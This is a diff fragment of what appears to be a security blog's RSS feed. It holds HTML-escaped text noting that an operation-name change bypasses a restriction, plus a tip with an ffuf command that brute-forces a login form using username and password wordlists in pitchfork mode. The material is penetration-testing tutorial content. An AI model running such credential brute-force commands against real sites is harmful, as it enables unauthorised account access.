+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_165718.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can bypass this by changing operation name :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_170146.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;bonus-tip&#34;&gt;[BONUS] Tip&lt;/h2&gt;
+&lt;p&gt;By default, FFUF works in clusterbomb mode.&lt;br&gt;
+If you want to scan in pitchfork mode, add the &lt;code&gt;-mode pitchfork&lt;/code&gt; flag to your command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -u http://targetwebsite.com -w /path/to/list/username.txt:FUZZ1 -w /path/to/list/password.txt:FUZZ2 -X POST -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username=FUZZ1&amp;amp;passwd=FUZZ2&amp;amp;submit=Submit&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span&gt; -mode pitchfork
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
     </item>
     
     <item>
